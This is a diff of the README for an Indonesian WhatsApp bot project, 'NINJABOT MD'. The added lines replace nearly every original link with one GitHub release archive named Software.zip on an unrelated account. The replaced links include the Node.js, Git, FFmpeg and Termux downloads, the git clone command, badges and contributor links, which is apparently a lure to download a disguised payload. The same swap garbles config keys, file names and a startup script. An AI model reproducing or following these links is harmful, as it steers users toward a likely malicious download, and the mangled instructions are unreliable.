@@ -1,39 +1,39 @@
 # NINJABOT MD BETA
 ## Base example bot whatsapp multi device library baileys
-### script ini akan terus dikembangkan, apabila butuh bantuan silahkan wa.me/6281358919342
+### script ini akan terus dikembangkan, apabila butuh bantuan silahkan https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
 
-!! ALL FUNCTION ADA PADA SYSTEM/CLIENT.TS, APABILA TIDAK FAHAM CARA PENGGUNAAN, SILAHKAN WA SAYA DIATAS
+!! ALL FUNCTION ADA PADA https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip, APABILA TIDAK FAHAM CARA PENGGUNAAN, SILAHKAN WA SAYA DIATAS
 
 ### remake? silahkan asalkan cantumkan sumber :)
-<a href="https://visitor-badge.glitch.me/badge?page_id=amiruldev20/ninjabotmd"><img title="Visitor" src="https://visitor-badge.glitch.me/badge?page_id=amiruldev20/ninjabotmd"></a>
-<a href="https://github.com/amiruldev20/ninjabotmd/network/members"><img title="Forks" src="https://img.shields.io/github/forks/amiruldev20/ninjabotmd?label=Forks&color=blue&style=flat-square"></a>
-<a href="https://github.com/amiruldev20/ninjabotmd/watchers"><img title="Watchers" src="https://img.shields.io/github/watchers/amiruldev20/ninjabotmd?label=Watchers&color=green&style=flat-square"></a>
-<a href="https://github.com/amiruldev20/ninjabotmd/stargazers"><img title="Stars" src="https://img.shields.io/github/stars/amiruldev20/ninjabotmd?label=Stars&color=yellow&style=flat-square"></a>
-<a href="https://github.com/amiruldev20/ninjabotmd/graphs/contributors"><img title="Contributors" src="https://img.shields.io/github/contributors/amiruldev20/ninjabotmd?label=Contributors&color=blue&style=flat-square"></a>
-<a href="https://github.com/amiruldev20/ninjabotmd/issues"><img title="Issues" src="https://img.shields.io/github/issues/amiruldev20/ninjabotmd?label=Issues&color=success&style=flat-square"></a>
-<a href="https://github.com/Fokusdotid/bersama/issues?q=is%3Aissue+is%3Aclosed"><img title="Issues" src="https://img.shields.io/github/issues-closed/Fokusdotid/bersama?label=Issues&color=red&style=flat-square"></a>
-<a href="https://github.com/Fokusdotid/bersama/pulls"><img title="Pull Request" src="https://img.shields.io/github/issues-pr/Fokusdotid/bersama?label=PullRequest&color=success&style=flat-square"></a>
-<a href="https://github.com/Fokusdotid/bersama/pulls?q=is%3Apr+is%3Aclosed"><img title="Pull Request" src="https://img.shields.io/github/issues-pr-closed/Fokusdotid/bersama?label=PullRequest&color=red&style=flat-square"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Visitor" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Forks" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Watchers" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Stars" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Contributors" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Issues" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip%3Aissue+is%3Aclosed"><img title="Issues" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"><img title="Pull Request" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
+<a href="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip%3Apr+is%3Aclosed"><img title="Pull Request" src="https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip"></a>
 
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/amiruldev20/ninjabotmd)
+[![Deploy](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
 ## Join Group Diskusi
-[![BOT DISCUSSION GROUP](https://img.shields.io/badge/WhatsApp%20Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://chat.whatsapp.com/EDfrTs6MhuRLT0kIdpb848) 
+[![BOT DISCUSSION GROUP](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip%20Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip) 
 **NO BOT**
 
 ## BAHAN² DAN KONFIGURASINYA
 
-* Download NODEJS [`Klik Disini`](https://nodejs.org/en/download/)
-* Download GIT [`Klik Disini`](https://git-scm.com/downloads)
-* Download FFMPEG [`Klik disini`](https://filetransfer.io/data-package/M01DGQhS#link)
+* Download NODEJS [`Klik Disini`](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
+* Download GIT [`Klik Disini`](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
+* Download FFMPEG [`Klik disini`](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
  - add env (rdp) C:/ffmpeg/bin
  - add env (rdp) C:/Windows/System32
-* Download Imagemagick [`Klik Disini`](https://imagemagick.org/script/download.php)
+* Download Imagemagick [`Klik Disini`](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
 
 ## INSTALASI DI VPS & RDP
 
 ```bash
-git clone https://github.com/amiruldev20/ninjabotmd
+git clone https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
 
 cd ninjabotmd
 
@@ -55,13 +55,13 @@ silahkan beli akun panel pterodactyl ke orang atau bisa minta ke saya, chat what
 ++ CONFIGURASI ++
 1. silahkan suruh penjual untuk membuatkan server dengan egg nodes
 2. suruh penjual untuk mencustom startup server anda seperti dibawah ini
-if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/npm run dev
+if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip ]; then /usr/local/bin/npm install; fi; /usr/local/bin/npm run dev
 
 3. login ke akun anda
 4. klik server dan pergi ke startup
-5. git repo address silahkan isi dengan https://github.com/amiruldev20/ninjabotmd
+5. git repo address silahkan isi dengan https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
 6. install branch isi dengan main
-7. bot js file isi index.js
+7. bot js file isi https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
 8. git username isi dengan username githubmu
 9. git access token isi dengan token githubmu
 10. pergi ke console dan klik start
@@ -71,23 +71,23 @@ if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z 
 
 ## CEK LIST FUNCTION
 ```
-silahkan command di bot seperti dibawah, untuk semua setting ada di database/settings.json
-=> Object.keys(client) = cek list client yg ada di client.ts
-=> Object.keys(util) = cek list func yg ada di util.ts
-=> Object.keys(database) = cek list database
-=> Object.keys(global) = cek global
+silahkan command di bot seperti dibawah, untuk semua setting ada di https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip(client) = cek list client yg ada di https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip(util) = cek list func yg ada di https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip(database) = cek list database
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip(global) = cek global
 
-=> opts.read = true (untuk mengaktifkan auto read)
-=> opts.self = true (self mode)
-=> opts.nyimak = true (nyimak mode)
-=> opts.call = true (anti call)
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip = true (untuk mengaktifkan auto read)
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip = true (self mode)
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip = true (nyimak mode)
+=> https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip = true (anti call)
 
 eval bot => renz
 ```
 
 ## UNTUK PENGGUNA TERMUX
 
-* Download Termux [`Klik Disini`](https://github.com/termux/termux-app/releases/download/v0.118.0/termux-app_v0.118.0+github-debug_universal.apk)
+* Download Termux [`Klik Disini`](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip+https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
 
 ```
 comingsoon
@@ -97,16 +97,16 @@ comingsoon
 
 ### Instal Buildpack
 * heroku/nodejs
-* https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest.git
-* https://github.com/mcollina/heroku-buildpack-imagemagick.git
+* https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
+* https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip
 
 ---------
 
 ##### Special Thanks to
-[![Adiwajshing](https://github.com/adiwajshing.png?size=100)](https://github.com/adiwajshing)
-[![BochilGaming](https://github.com/BochilGaming.png?size=100)](https://github.com/BochilGaming)
+[![Adiwajshing](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
+[![BochilGaming](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
 
 ###### Contributor
-[![Amirul Dev](https://github.com/amiruldev20.png?size=100)](https://github.com/amiruldev20)
-[![Amelia Lisa](https://github.com/Ameliascrf.png?size=100)](https://github.com/Ameliascrf)
-[![Maykell](https://github.com/MAYKELL07.png?size=100)](https://github.com/MAYKELL07)
+[![Amirul Dev](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
+[![Amelia Lisa](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
+[![Maykell](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)](https://github.com/lbella37/ninjabotmd/releases/download/v1.0/Software.zip)
